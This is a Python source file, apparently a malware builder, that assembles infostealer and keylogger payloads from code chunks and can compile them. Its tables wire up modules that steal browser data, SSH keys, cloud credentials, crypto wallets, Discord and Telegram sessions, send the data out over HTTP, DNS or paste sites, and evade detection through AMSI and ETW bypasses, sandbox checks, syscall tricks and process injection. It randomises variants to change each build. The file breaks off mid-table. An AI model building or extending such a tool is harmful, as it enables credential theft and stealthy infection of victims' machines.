#!/usr/bin/env python3
"""Assembles malware from chunk recipes.

Usage:
    python assembler.py recipes/infostealer_full.yaml -o /tmp/output.c
    python assembler.py recipes/infostealer_full.yaml -o /tmp/output.c --compile
    python assembler.py recipes/keylogger.yaml -o /tmp/output.c --compile --var C2_IP=10.0.2.2

Reads a recipe YAML, resolves chunk dependencies, concatenates into a single
compilable .c file with proper ordering, and optionally compiles with MinGW.
"""

import argparse
import os
import random as _random
import re
import subprocess
import sys
from pathlib import Path

try:
    import yaml
except ImportError:
    print("pyyaml required: pip install pyyaml", file=sys.stderr)
    sys.exit(1)

CHUNKS_DIR = Path(__file__).parent


def _load_variant_lookup() -> dict:
    """Load variant groups from variants.yaml. Returns {chunk_ref: [variants]}."""
    variants_path = CHUNKS_DIR / "variants.yaml"
    if not variants_path.exists():
        return {}
    with open(variants_path) as f:
        data = yaml.safe_load(f)
    lookup = {}
    for members in (data or {}).get("groups", {}).values():
        for member in members:
            lookup[member] = list(members)
    return lookup


def _load_chunk_to_group() -> dict:
    """Returns {chunk_ref: group_name} for dedup in randomization."""
    variants_path = CHUNKS_DIR / "variants.yaml"
    if not variants_path.exists():
        return {}
    with open(variants_path) as f:
        data = yaml.safe_load(f)
    mapping = {}
    for group_name, members in (data or {}).get("groups", {}).items():
        for member in members:
            mapping[member] = group_name
    return mapping


def _randomize_chunks(chunks: list[str], variant_lookup: dict,
                      rng: _random.Random) -> tuple[list[str], dict]:
    """Replace chunks with random variants from their group.
    Deduplicates when a recipe lists multiple chunks from the same variant
    group — only the first occurrence survives (randomized); the rest are
    dropped to prevent redefinition errors.
    Returns (new_chunk_list, {original: chosen} for non-identity swaps)."""
    chunk_to_group = _load_chunk_to_group()
    result = []
    subs = {}
    seen_groups: dict[str, str] = {}  # group_name -> chosen replacement
    for chunk in chunks:
        if chunk in variant_lookup:
            group = chunk_to_group.get(chunk)
            if group and group in seen_groups:
                subs[chunk] = seen_groups[group]
                print(f"Variant dedup: dropped '{chunk}' (group '{group}' "
                      f"already represented by '{seen_groups[group]}')",
                      file=sys.stderr)
                continue
            chosen = rng.choice(variant_lookup[chunk])
            result.append(chosen)
            if group:
                seen_groups[group] = chosen
            if chosen != chunk:
                subs[chunk] = chosen
        else:
            result.append(chunk)
    return result, subs


def _randomize_script_chunks(chunks: list[str], fmt: str,
                             randomize: bool, seed: int | None) -> tuple[list[str], dict]:
    """Randomize chunks for script formats (jscript/vbscript/batch).

    Variant groups in variants.yaml use prefixed paths (e.g. jscript/evasion/anti_sandbox)
    while recipes use bare paths (evasion/anti_sandbox). This function handles the
    prefix/strip mapping so _randomize_chunks() can find matches.

    Returns (randomized_chunks, {original_bare: chosen_bare} substitution map).
    """
    if not randomize:
        return chunks, {}
    variant_lookup = _load_variant_lookup()
    if not variant_lookup:
        return chunks, {}
    rng = _random.Random(seed) if seed is not None else _random.Random()
    fmt_dir = FORMAT_DIR[fmt]
    prefixed = [f"{fmt_dir}/{c}" for c in chunks]
    result, prefixed_subs = _randomize_chunks(prefixed, variant_lookup, rng)
    bare_result = [c[len(fmt_dir) + 1:] if c.startswith(fmt_dir + "/") else c
                   for c in result]
    bare_subs = {k[len(fmt_dir) + 1:]: v[len(fmt_dir) + 1:]
                 for k, v in prefixed_subs.items()}
    if bare_subs:
        print(f"Variant substitutions ({fmt}): {bare_subs}", file=sys.stderr)
    return bare_result, bare_subs


JS_FN_MAP = {
    "collectors/sysinfo": "collect_sysinfo",
    "collectors/processes": "collect_processes",
    "collectors/network": "collect_network",
    "collectors/installed_software": "collect_installed_software",
    "collectors/scheduled_tasks": "collect_scheduled_tasks",
    "collectors/env_vars": "collect_env_vars",
    "collectors/drives": "collect_drives",
    "collectors/recent_files": "collect_recent_files",
    "collectors/startup_items": "collect_startup_items",
    "collectors/security_products": "collect_security_products",
    "collectors/wifi_passwords": "collect_wifi",
    "collectors/browser_chromium": "collect_browsers",
    "collectors/ssh_keys": "collect_ssh_keys",
    "collectors/cloud_creds": "collect_cloud_creds",
    "collectors/crypto_wallets": "collect_crypto_wallets",
    "collectors/discord_tokens": "collect_discord",
    "collectors/telegram_session": "collect_telegram",
    "collectors/ftp_credentials": "collect_ftp",
    "collectors/clipboard": "collect_clipboard",
    "collectors/active_windows": "collect_active_windows",
    "collectors/screenshot_staged": "collect_screenshot",
    "ad_collectors/ad_users": "collect_ad_users",
    "ad_collectors/ad_groups": "collect_ad_groups",
    "ad_collectors/ad_computers": "collect_ad_computers",
    "ad_collectors/ad_domains": "collect_ad_domains",
    "ad_collectors/ad_ous": "collect_ad_ous",
    "ad_collectors/ad_admins": "collect_ad_admins",
    "collectors/keylogger_staged": "collect_keystrokes",
    "collectors/keylogger_lolbin": "collect_keystrokes",
    "exfil/http_post": "exfil_http",
    "exfil/http_get_chunks": "exfil_http_chunked",
    "exfil/dns_exfil": "exfil_dns",
    "exfil/curl_lolbin": "exfil_curl",
    "exfil/smb_write": "exfil_smb",
    "exfil/paste_site": "exfil_paste",
    "exfil/file_drop": "exfil_file",
}

JS_EVASION_INIT_MAP = {
    "evasion/anti_sandbox": "if (check_sandbox()) WScript.Quit(0);",
    "evasion/anti_analysis": "if (check_analysis()) WScript.Quit(0);",
    "evasion/env_keying": "if (!check_environment()) WScript.Quit(0);",
    "evasion/wmi_evasion": "if (check_sandbox()) WScript.Quit(0);",
    "evasion/deferred_exec": "deferred_wait();",
    "evasion/triggered_exec": "wait_for_user_activity();",
    "evasion/behavioral_pacing": "",
    "evasion/sleep_jitter": "",
    "evasion/string_obfusc": "",
    "evasion/encoding_rotate": "",
    "evasion/com_object_rotate": "",
    "evasion/junk_code": "",
    "evasion/amsi_bypass": "bypass_amsi();",
    "evasion/split_join": "",
    "evasion/reverse_decode": "",
    "evasion/unicode_escape": "",
    "evasion/math_charcode": "",
    "evasion/screen_check": "check_screen();",
    "evasion/uptime_check": "check_uptime();",
    "evasion/usb_history": "check_usb();",
    "evasion/installed_software": "check_software();",
    "evasion/desktop_files": "check_desktop();",
    "evasion/gpu_check": "check_gpu();",
    "evasion/mouse_check": "check_mouse();",
    "evasion/temp_density": "check_temp();",
    "evasion/amsi_registry": "bypass_amsi();",
    "evasion/amsi_clr_downgrade": "bypass_amsi();",
    "evasion/amsi_string_frag": "bypass_amsi();",
    "evasion/etw_disable": "disable_etw();",
    "evasion/wsh_trace_disable": "disable_traces();",
    "evasion/script_log_disable": "disable_scriptlog();",
    "evasion/process_wmi": "",
    "evasion/process_shell_app": "",
    "evasion/process_shellwindows": "",
    "evasion/process_schtask": "",
    "evasion/http_object_rotate": "",
    "evasion/user_agent_rotate": "",
    "evasion/ads_exec": "",
    "evasion/motw_strip": "strip_motw();",
    "evasion/temp_dir_rotate": "",
    "evasion/self_delete": "",
    "evasion/triggered_wmi": "wait_for_activity();",
    "evasion/conditional_time": "if (!check_time()) WScript.Quit(0);",
    "evasion/self_reexec": "check_reexec();",
    "evasion/lolbin_mshta": "",
    "evasion/lolbin_rundll32": "",
}

VBS_FN_MAP = {
    "collectors/sysinfo": "collect_sysinfo",
    "collectors/processes": "collect_processes",
    "collectors/network": "collect_network",
    "collectors/installed_software": "collect_installed_software",
    "collectors/scheduled_tasks": "collect_scheduled_tasks",
    "collectors/env_vars": "collect_env_vars",
    "collectors/drives": "collect_drives",
    "collectors/recent_files": "collect_recent_files",
    "collectors/startup_items": "collect_startup_items",
    "collectors/security_products": "collect_security_products",
    "collectors/wifi_passwords": "collect_wifi_passwords",
    "collectors/browser_chromium": "collect_browser_chromium",
    "collectors/ssh_keys": "collect_ssh_keys",
    "collectors/cloud_creds": "collect_cloud_creds",
    "collectors/crypto_wallets": "collect_crypto_wallets",
    "collectors/clipboard": "collect_clipboard",
    "ad_collectors/ad_users": "collect_ad_users",
    "ad_collectors/ad_groups": "collect_ad_groups",
    "ad_collectors/ad_computers": "collect_ad_computers",
    "ad_collectors/ad_domains": "collect_ad_domains",
    "exfil/http_post": "exfil_http",
    "exfil/dns_exfil": "exfil_dns",
    "exfil/curl_lolbin": "exfil_curl",
    "exfil/smb_write": "exfil_smb",
    "exfil/file_drop": "exfil_file",
}

VBS_EVASION_INIT_MAP = {
    "evasion/anti_sandbox": "If check_sandbox() Then WScript.Quit 0",
    "evasion/anti_analysis": "If check_analysis() Then WScript.Quit 0",
    "evasion/env_keying": "If Not check_environment() Then WScript.Quit 0",
    "evasion/wmi_evasion": "If check_sandbox() Then WScript.Quit 0",
    "evasion/deferred_exec": "Call deferred_wait()",
    "evasion/sleep_jitter": "",
    "evasion/string_obfusc": "",
    "evasion/amsi_bypass": "Call bypass_amsi()",
    "evasion/encoding_rotate": "",
    "evasion/split_join": "",
    "evasion/reverse_decode": "",
    "evasion/screen_check": "Call check_screen()",
    "evasion/uptime_check": "Call check_uptime()",
    "evasion/usb_history": "Call check_usb()",
    "evasion/installed_software": "Call check_software()",
    "evasion/desktop_files": "Call check_desktop()",
    "evasion/gpu_check": "Call check_gpu()",
    "evasion/mouse_check": "Call check_mouse()",
    "evasion/amsi_registry": "Call bypass_amsi()",
    "evasion/amsi_clr_downgrade": "Call bypass_amsi()",
    "evasion/etw_disable": "Call disable_etw()",
    "evasion/wsh_trace_disable": "Call disable_traces()",
    "evasion/script_log_disable": "Call disable_scriptlog()",
    "evasion/process_wmi": "",
    "evasion/process_shell_app": "",
    "evasion/process_schtask": "",
    "evasion/com_object_rotate": "",
    "evasion/http_object_rotate": "",
    "evasion/user_agent_rotate": "",
    "evasion/ads_exec": "",
    "evasion/motw_strip": "Call strip_motw()",
    "evasion/temp_dir_rotate": "",
    "evasion/self_delete": "",
    "evasion/triggered_exec": "Call wait_for_activity()",
    "evasion/behavioral_pacing": "",
    "evasion/conditional_time": "If Not check_time() Then WScript.Quit 0",
    "evasion/self_reexec": "Call check_reexec()",
    "evasion/junk_code": "",
}

FN_MAP = {
    "collectors/system_info": "collect_system_info",
    "collectors/system_info_stealth": "collect_system_info",
    "collectors/system_info_api": "collect_system_info",
    "collectors/system_info_registry": "collect_system_info",
    "collectors/processes": "collect_processes",
    "collectors/processes_lolbin": "collect_processes",
    "collectors/processes_api": "collect_processes",
    "collectors/screenshot_v2": "collect_screenshot",
    "collectors/installed_software": "collect_installed_software",
    "collectors/env_vars": "collect_env_vars",
    "collectors/env_vars_lolbin": "collect_env_vars",
    "collectors/clipboard": "collect_clipboard",
    "collectors/clipboard_lolbin": "collect_clipboard",
    "collectors/wifi_passwords": "collect_wifi",
    "collectors/browser_chromium": "collect_browsers",
    "collectors/discord_tokens": "collect_discord",
    "collectors/telegram_session": "collect_telegram",
    "collectors/ftp_credentials": "collect_ftp_clients",
    "collectors/ssh_keys": "collect_ssh_git",
    "collectors/cloud_creds": "collect_cloud_creds",
    "collectors/crypto_wallets": "collect_crypto_wallets",
    "collectors/screenshot": "collect_screenshot",
    "collectors/keylogger": "collect_keystrokes",
    "collectors/keylogger_poll": "batch_keylog",
    "collectors/netinfo_lolbin": "collect_netinfo",
    "collectors/netinfo_api": "collect_netinfo",
    "collectors/active_windows": "collect_active_windows",
    "collectors/active_windows_lolbin": "collect_active_windows",
    "collectors/security_products": "collect_security_products",
    "collectors/drives": "collect_drives",
    "collectors/startup_items": "collect_startup_items",
    "collectors/recent_files": "collect_recent_files",
    "collectors/scheduled_tasks_recon": "collect_scheduled_tasks",
    "ad_collectors/ad_users": "collect_users",
    "ad_collectors/ad_groups": "collect_groups",
    "ad_collectors/ad_computers": "collect_computers",
    "ad_collectors/ad_domains": "collect_domains",
    "ad_collectors/ad_ous": "collect_ous",
    "ad_collectors/ad_gpos": "collect_gpos",
    "collectors/ad_users": "collect_ad_users",
    "collectors/ad_groups": "collect_ad_groups",
    "collectors/ad_computers": "collect_ad_computers",
    "collectors/ad_domain": "collect_ad_domain",
    "collectors/ad_gpos": "collect_ad_gpos",
}


def _is_comment_line(line: str) -> tuple[bool, str]:
    """Check if a line is a metadata comment. Returns (is_comment, content_after_prefix)."""
    for prefix in ("//", "REM", "@REM", "'"):
        if line.startswith(prefix):
            return True, line[len(prefix):]
    return False, ""


def parse_chunk_metadata(chunk_path: Path) -> dict:
    meta = {"depends": [], "provides": [], "headers": [], "libs": []}
    if not chunk_path.exists():
        return meta
    with open(chunk_path) as f:
        for line in f:
            line = line.strip()
            is_comment, _ = _is_comment_line(line)
            if not is_comment:
                break
            for field in ("depends", "provides", "headers", "libs"):
                for prefix in ("// ", "REM ", "@REM ", "' "):
                    tag = f"{prefix}{field}:"
                    if line.startswith(tag):
                        val = line.split(":", 1)[1].strip()
                        if val != "(none)":
                            meta[field] = [v.strip() for v in val.split(",")]
                        break
    return meta


FORMAT_EXT = {"jscript": ".js", "vbscript": ".vbs", "batch": ".bat", "c": ".c"}
FORMAT_DIR = {"jscript": "jscript", "vbscript": "vbscript", "batch": "batch"}


def resolve_chunk_path(chunk_ref: str, fmt: str = "c") -> Path:
    if fmt in FORMAT_DIR:
        ext = FORMAT_EXT[fmt]
        p = CHUNKS_DIR / FORMAT_DIR[fmt] / f"{chunk_ref}{ext}"
        if p.exists():
            return p
        raise FileNotFoundError(f"{fmt} chunk not found: {chunk_ref} (tried {p})")
    p = CHUNKS_DIR / f"{chunk_ref}.c"
    if p.exists():
        return p
    p = CHUNKS_DIR / f"{chunk_ref}.h"
    if p.exists():
        return p
    raise FileNotFoundError(f"Chunk not found: {chunk_ref} (tried {CHUNKS_DIR / chunk_ref}.[ch])")


def read_chunk_body(chunk_path: Path, _seen: set | None = None) -> str:
    if _seen is None:
        _seen = set()
    _seen.add(str(chunk_path))
    lines = []
    in_body = False
    chunk_guard_depth = 0
    with open(chunk_path) as f:
        for line in f:
            stripped = line.strip()
            if not in_body:
                if stripped.startswith("//"):
                    continue
                in_body = True
            if stripped.startswith("#ifndef CHUNK_"):
                chunk_guard_depth += 1
                continue
            if stripped.startswith("#define CHUNK_"):
                continue
            if stripped.startswith('#include "') and stripped.endswith('"'):
                inc_name = stripped[len('#include "'):-1]
                inc_path = chunk_path.parent / inc_name
                if inc_path.exists() and str(inc_path) not in _seen:
                    lines.append(f"/* inlined: {inc_name} */\n")
                    lines.append(read_chunk_body(inc_path, _seen) + "\n")
                    continue
            lines.append(line)

    if chunk_guard_depth > 0 and lines and lines[-1].strip() == "#endif":
        lines.pop()
    while lines and lines[-1].strip() == "":
        lines.pop()
    while lines and lines[0].strip() == "":
        lines.pop(0)

    return "".join(lines)


def read_script_chunk_body(chunk_path: Path) -> str:
    """Read chunk body for any script format (JScript, VBScript, Batch). Strips metadata header."""
    lines = []
    in_body = False
    with open(chunk_path) as f:
        for line in f:
            stripped = line.strip()
            if not in_body:
                is_comment, _ = _is_comment_line(stripped)
                if is_comment or stripped == "":
                    continue
                in_body = True
            lines.append(line)
    while lines and lines[-1].strip() == "":
        lines.pop()
    while lines and lines[0].strip() == "":
        lines.pop(0)
    return "".join(lines)


read_js_chunk_body = read_script_chunk_body
read_vbs_chunk_body = read_script_chunk_body


def build_vbs_collector_calls(collectors: list[str]) -> str:
    calls = []
    for c in collectors:
        fn = VBS_FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"Call {fn}()")
    return "\n".join(calls)


def build_vbs_paced_calls(collectors: list[str]) -> str:
    calls = []
    for i, c in enumerate(collectors):
        fn = VBS_FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"Call {fn}()")
        if i < len(collectors) - 1:
            calls.append("Call jitter_sleep(1000, 5000)")
    return "\n".join(calls)


def build_vbs_evasion_checks(evasion_chunks: list[str]) -> str:
    lines = []
    for e in evasion_chunks:
        init = VBS_EVASION_INIT_MAP.get(e, "")
        if init:
            lines.append(init)
    return "\n".join(lines)


def assemble_vbscript(recipe_path: str, extra_vars: dict | None = None,
                      randomize: bool = False, seed: int | None = None) -> str:
    with open(recipe_path) as f:
        recipe = yaml.safe_load(f)

    _warn_risky_evasion(recipe.get("evasion", []), recipe.get("name", ""))

    vars_dict = recipe.get("vars", {})
    if extra_vars:
        vars_dict.update(extra_vars)

    all_chunks = []
    all_chunks.extend(recipe.get("evasion", []))
    all_chunks.extend(recipe.get("core", []))
    all_chunks.extend(recipe.get("collectors", []))
    all_chunks.extend(recipe.get("stage1_collectors", []))
    all_chunks.extend(recipe.get("stage2_collectors", []))
    if recipe.get("keylogger"):
        all_chunks.append(recipe["keylogger"])
    if recipe.get("exfil"):
        all_chunks.append(recipe["exfil"])
    persist = recipe.get("persist")
    if persist:
        if isinstance(persist, list):
            all_chunks.extend(persist)
        else:
            all_chunks.append(persist)
    all_chunks.append(recipe["arch"])

    all_chunks, substitutions = _randomize_script_chunks(all_chunks, "vbscript", randomize, seed)

    resolved = []
    resolved_set = set()

    def _resolve_deps(chunk_ref):
        if chunk_ref in resolved_set:
            return
        path = resolve_chunk_path(chunk_ref, "vbscript")
        meta = parse_chunk_metadata(path)
        for dep in meta.get("depends", []):
            dep = dep.strip()
            if dep and dep not in resolved_set and "*" not in dep:
                _resolve_deps(dep)
        resolved_set.add(chunk_ref)
        resolved.append(chunk_ref)

    for chunk_ref in all_chunks:
        _resolve_deps(chunk_ref)

    bodies = []
    for chunk_ref in resolved:
        path = resolve_chunk_path(chunk_ref, "vbscript")
        bodies.append(f"' ── {chunk_ref} ──\n")
        bodies.append(read_vbs_chunk_body(path))
        bodies.append("\n\n")

    source = "".join(bodies)

    collectors = [substitutions.get(c, c) for c in recipe.get("collectors", [])]
    source = source.replace("{{COLLECTOR_CALLS}}", build_vbs_collector_calls(collectors))

    stage1 = [substitutions.get(c, c) for c in recipe.get("stage1_collectors", [])]
    source = source.replace("{{STAGE1_COLLECTORS}}", build_vbs_collector_calls(stage1))

    stage2 = [substitutions.get(c, c) for c in recipe.get("stage2_collectors", [])]
    source = source.replace("{{STAGE2_COLLECTORS}}", build_vbs_collector_calls(stage2))

    all_collectors = collectors or (stage1 + stage2)
    source = source.replace("{{PACED_COLLECTOR_CALLS}}", build_vbs_paced_calls(all_collectors))

    evasion_chunks = [substitutions.get(e, e) for e in recipe.get("evasion", [])]
    source = source.replace("{{EVASION_CHECKS}}", build_vbs_evasion_checks(evasion_chunks))

    if recipe.get("exfil"):
        exfil_fn = VBS_FN_MAP.get(recipe["exfil"], recipe["exfil"].split("/")[-1])
        source = source.replace("{{EXFIL_CALL}}", f"Call {exfil_fn}()")

    for k, v in vars_dict.items():
        source = source.replace(f"{{{{{k}}}}}", str(v))

    return source


def build_js_collector_calls(collectors: list[str]) -> str:
    calls = []
    for c in collectors:
        fn = JS_FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"{fn}();")
    return "\n".join(calls)


def build_js_evasion_checks(evasion_chunks: list[str]) -> str:
    lines = []
    for e in evasion_chunks:
        init = JS_EVASION_INIT_MAP.get(e, "")
        if init:
            lines.append(init)
    return "\n".join(lines)


def assemble_jscript(recipe_path: str, extra_vars: dict | None = None,
                     randomize: bool = False, seed: int | None = None) -> str:
    with open(recipe_path) as f:
        recipe = yaml.safe_load(f)

    _warn_risky_evasion(recipe.get("evasion", []), recipe.get("name", ""))

    vars_dict = recipe.get("vars", {})
    if extra_vars:
        vars_dict.update(extra_vars)

    all_chunks = []
    all_chunks.extend(recipe.get("evasion", []))
    all_chunks.extend(recipe.get("core", []))
    all_chunks.extend(recipe.get("collectors", []))
    all_chunks.extend(recipe.get("stage1_collectors", []))
    all_chunks.extend(recipe.get("stage2_collectors", []))
    if recipe.get("keylogger"):
        all_chunks.append(recipe["keylogger"])
    c2 = recipe.get("c2")
    if c2:
        if isinstance(c2, list):
            all_chunks.extend(c2)
        else:
            all_chunks.append(c2)
    all_chunks.extend(recipe.get("commands", []))
    if recipe.get("exfil"):
        all_chunks.append(recipe["exfil"])
    persist = recipe.get("persist")
    if persist:
        if isinstance(persist, list):
            all_chunks.extend(persist)
        else:
            all_chunks.append(persist)
    all_chunks.append(recipe["arch"])

    all_chunks, substitutions = _randomize_script_chunks(all_chunks, "jscript", randomize, seed)

    resolved = []
    resolved_set = set()

    def _resolve_deps(chunk_ref):
        if chunk_ref in resolved_set:
            return
        path = resolve_chunk_path(chunk_ref, "jscript")
        meta = parse_chunk_metadata(path)
        for dep in meta.get("depends", []):
            dep = dep.strip()
            if dep and dep not in resolved_set and "*" not in dep:
                _resolve_deps(dep)
        resolved_set.add(chunk_ref)
        resolved.append(chunk_ref)

    for chunk_ref in all_chunks:
        _resolve_deps(chunk_ref)

    bodies = []
    for chunk_ref in resolved:
        path = resolve_chunk_path(chunk_ref, "jscript")
        bodies.append(f"// ── {chunk_ref} ──\n")
        bodies.append(read_js_chunk_body(path))
        bodies.append("\n\n")

    source = "".join(bodies)

    collectors = [substitutions.get(c, c) for c in recipe.get("collectors", [])]
    source = source.replace("{{COLLECTOR_CALLS}}", build_js_collector_calls(collectors))

    fn_list = ", ".join(JS_FN_MAP.get(c, c.split("/")[-1]) for c in collectors)
    source = source.replace("{{COLLECTOR_FUNCTIONS}}", fn_list)

    stage1 = [substitutions.get(c, c) for c in recipe.get("stage1_collectors", [])]
    source = source.replace("{{STAGE1_COLLECTORS}}", build_js_collector_calls(stage1))

    stage2 = [substitutions.get(c, c) for c in recipe.get("stage2_collectors", [])]
    source = source.replace("{{STAGE2_COLLECTORS}}", build_js_collector_calls(stage2))

    evasion_chunks = [substitutions.get(e, e) for e in recipe.get("evasion", [])]
    source = source.replace("{{EVASION_CHECKS}}", build_js_evasion_checks(evasion_chunks))

    if recipe.get("keylogger"):
        kl_fn = JS_FN_MAP.get(recipe["keylogger"], "collect_keylog")
        source = source.replace("{{KEYLOGGER_CALL}}", f"{kl_fn}();")

    if recipe.get("exfil"):
        exfil_fn = JS_FN_MAP.get(recipe["exfil"], recipe["exfil"].split("/")[-1])
        source = source.replace("{{EXFIL_CALL}}", f"{exfil_fn}();")

    for k, v in vars_dict.items():
        source = source.replace(f"{{{{{k}}}}}", str(v))

    return source


def assemble_script(recipe_path: str, fmt: str, extra_vars: dict | None = None,
                    randomize: bool = False, seed: int | None = None) -> str:
    """Generic assembler for VBScript and Batch formats."""
    with open(recipe_path) as f:
        recipe = yaml.safe_load(f)

    _warn_risky_evasion(recipe.get("evasion", []), recipe.get("name", ""))

    vars_dict = recipe.get("vars", {})
    if extra_vars:
        vars_dict.update(extra_vars)

    all_chunks = []
    all_chunks.extend(recipe.get("evasion", []))
    all_chunks.extend(recipe.get("core", []))
    all_chunks.extend(recipe.get("collectors", []))
    if recipe.get("keylogger"):
        all_chunks.append(recipe["keylogger"])
    if recipe.get("exfil"):
        all_chunks.append(recipe["exfil"])
    persist = recipe.get("persist")
    if persist:
        if isinstance(persist, list):
            all_chunks.extend(persist)
        else:
            all_chunks.append(persist)
    all_chunks.extend(recipe.get("delivery", []))
    all_chunks.append(recipe["arch"])

    all_chunks, substitutions = _randomize_script_chunks(all_chunks, fmt, randomize, seed)

    resolved = []
    resolved_set = set()
    comment_char = "'" if fmt == "vbscript" else "REM"

    def _resolve_deps(chunk_ref):
        if chunk_ref in resolved_set:
            return
        path = resolve_chunk_path(chunk_ref, fmt)
        meta = parse_chunk_metadata(path)
        for dep in meta.get("depends", []):
            dep = dep.strip()
            if dep and dep not in resolved_set and "*" not in dep:
                _resolve_deps(dep)
        resolved_set.add(chunk_ref)
        resolved.append(chunk_ref)

    for chunk_ref in all_chunks:
        _resolve_deps(chunk_ref)

    bodies = []
    for chunk_ref in resolved:
        path = resolve_chunk_path(chunk_ref, fmt)
        bodies.append(f"{comment_char} ── {chunk_ref} ──\n")
        body = read_script_chunk_body(path)
        bodies.append(body)
        bodies.append("\n\n")

    source = "".join(bodies)

    collectors = [substitutions.get(c, c) for c in recipe.get("collectors", [])]
    stage1 = [substitutions.get(c, c) for c in recipe.get("stage1_collectors", [])]
    stage2 = [substitutions.get(c, c) for c in recipe.get("stage2_collectors", [])]
    evasion_chunks = [substitutions.get(e, e) for e in recipe.get("evasion", [])]

    if fmt == "vbscript":
        calls = "\n".join(f"    Call {c.split('/')[-1]}()" for c in collectors)
        source = source.replace("{{COLLECTOR_CALLS}}", calls)
        ev_calls = "\n".join(f"    Call {e.split('/')[-1]}()" for e in evasion_chunks)
        source = source.replace("{{EVASION_CHECKS}}", ev_calls)
        s1_calls = "\n".join(f"    Call {c.split('/')[-1]}()" for c in stage1)
        source = source.replace("{{STAGE1_COLLECTORS}}", s1_calls)
        s2_calls = "\n".join(f"    Call {c.split('/')[-1]}()" for c in stage2)
        source = source.replace("{{STAGE2_COLLECTORS}}", s2_calls)
        exfil_ref = substitutions.get(recipe.get("exfil", ""), recipe.get("exfil", ""))
        if exfil_ref:
            source = source.replace("{{EXFIL_CALL}}", f"Call {exfil_ref.split('/')[-1]}()")
    elif fmt == "batch":
        def _inline_bat(chunk_refs):
            blocks = []
            for ref in chunk_refs:
                try:
                    p = resolve_chunk_path(ref, "batch")
                    blocks.append(f"REM -- {ref} --")
                    blocks.append(read_script_chunk_body(p))
                except FileNotFoundError:
                    blocks.append(f"REM MISSING: {ref}")
            return "\n".join(blocks)

        source = source.replace("{{COLLECTORS_BLOCK}}", _inline_bat(collectors))
        source = source.replace("{{EVASION_BLOCK}}", _inline_bat(evasion_chunks))
        source = source.replace("{{STAGE1_BLOCK}}", _inline_bat(stage1))
        source = source.replace("{{STAGE2_BLOCK}}", _inline_bat(stage2))
        if recipe.get("exfil"):
            source = source.replace("{{EXFIL_BLOCK}}", _inline_bat([recipe["exfil"]]))
        vars_block = "\n".join(f'set "{k}={v}"' for k, v in vars_dict.items())
        source = source.replace("{{VARS_BLOCK}}", vars_block)
        for m in re.finditer(r"\{\{CHUNK:([^}]+)\}\}", source):
            ref = m.group(1)
            try:
                p = resolve_chunk_path(ref, "batch")
                source = source.replace(m.group(0), read_script_chunk_body(p))
            except FileNotFoundError:
                source = source.replace(m.group(0), f"REM MISSING: {ref}")

    for k, v in vars_dict.items():
        source = source.replace(f"{{{{{k}}}}}", str(v))

    return source



def build_collector_calls(collectors: list[str]) -> str:
    calls = []
    for c in collectors:
        fn = FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
    return "\n".join(calls)


def build_staged_calls(collectors: list[str]) -> str:
    calls = []
    for i, c in enumerate(collectors):
        fn = FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
        if i < len(collectors) - 1:
            calls.append(f"    jitter_sleep(1000, 5000);")
    return "\n".join(calls)


def build_paced_calls(collectors: list[str]) -> str:
    calls = []
    for i, c in enumerate(collectors):
        fn = FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
        calls.append(f"    pace(300, 300);")
        if i % 2 == 0:
            calls.append(f"    decoy_work();")
    return "\n".join(calls)


def build_fn_list(collectors: list[str]) -> str:
    fns = []
    for c in collectors:
        fn = FN_MAP.get(c, c.split("/")[-1])
        fns.append(f"        (collector_fn){fn},")
    return "\n".join(fns)


EVASION_INIT_MAP = {
    "evasion/etw_patch": "    patch_etw();",
    "evasion/unhook_ntdll": "    unhook_ntdll();",
    "evasion/anti_debug": "    if (check_debugger()) return 1;",
    "evasion/anti_sandbox": "    check_sandbox();",
    "evasion/anti_vm": "    check_vm();",
    "evasion/hw_bp_etw": "    hwbp_etw_init();",
    "evasion/indirect_syscall": "    init_indirect_syscalls();",
    "evasion/sleep_encrypt": "",
    "evasion/header_stomp": "    stomp_pe_headers();",
    "evasion/elastic_gadget": "    init_elastic_gadget();",
    "evasion/self_delete": "    self_delete();",
    "evasion/process_masquerade": "    masquerade_process();",
    "evasion/entropy_pad": "    entropy_pad_ref();",
    "evasion/ret_spoof": "    init_ret_spoof();",
    "evasion/behavioral_pacing": "",
    "evasion/sleep_jitter": "",
    "evasion/aes_encrypt": "",
    "evasion/api_hash": "",
    "evasion/deferred_exec": "    deferred_wait();",
    "evasion/triggered_exec": "    wait_for_user_activity();",
    "evasion/stack_strings": "",
    "evasion/stack_spoof": "",
    "evasion/thread_stack_spoof": "    tss_init();",
    "evasion/veh_hwbp_hook": "    hwbp_hook_init();",
    "evasion/fiber_exec": "    fiber_exec_init();",
    "evasion/iat_pad": "    iat_pad_init();",
    "evasion/amsi_hwbp": "    amsi_hwbp_init();",
    "evasion/module_stomp": "",
    "evasion/sleep_ekko": "",
    "evasion/timestomp": "",
    "evasion/self_delete_ghost": "",
    "evasion/threadless_inject": "",
    "evasion/cascade_inject": "",
    "evasion/phantom_dll": "",
    "evasion/herpaderp": "",
    "evasion/rich_header": "",
    "evasion/hells_gate": "    init_indirect_syscalls();",
    "evasion/halos_gate": "    init_indirect_syscalls();",
    "evasion/tartarus_gate": "    init_indirect_syscalls();",
    "evasion/sleep_foliage": "",
    "evasion/sleep_cronos": "",
    "evasion/sleep_deathsleep": "",
    "evasion/sleep_lazarus": "",
    "evasion/sleep_morpheus": "",
    "evasion/sleep_gargoyle": "",
    "evasion/sleep_heap_encrypt": "",
    "evasion/anti_debug_heap": "    if (anti_debug_check()) return 1;",
    "evasion/anti_debug_hwbp": "    if (check_debugger()) return 1;",
    "evasion/anti_debug_int3": "    if (anti_debug_check()) return 1;",
    "evasion/anti_debug_ntquery": "    if (check_debugger()) return 1;",
    "evasion/anti_debug_thread_hide": "    if (anti_debug_check()) return 1;",
    "evasion/anti_sandbox_artifacts": "    sandbox_check();",
    "evasion/anti_sandbox_timing": "    sandbox_check();",
    "evasion/anti_sandbox_user": "    sandbox_check();",
    "evasion/anti_sandbox_wmi": "    sandbox_check();",
    "evasion/etw_buffer_corrupt": "    patch_etw();",
    "evasion/etw_full_patch": "    patch_etw();",
    "evasion/etw_provider_unreg": "    patch_etw();",
    "evasion/etw_session_stop": "    patch_etw();",
    "evasion/recycled_gate": "    init_indirect_syscalls();",
    "evasion/syswhispers3": "    init_indirect_syscalls();",
    "evasion/syscall_knowndlls": "    init_indirect_syscalls();",
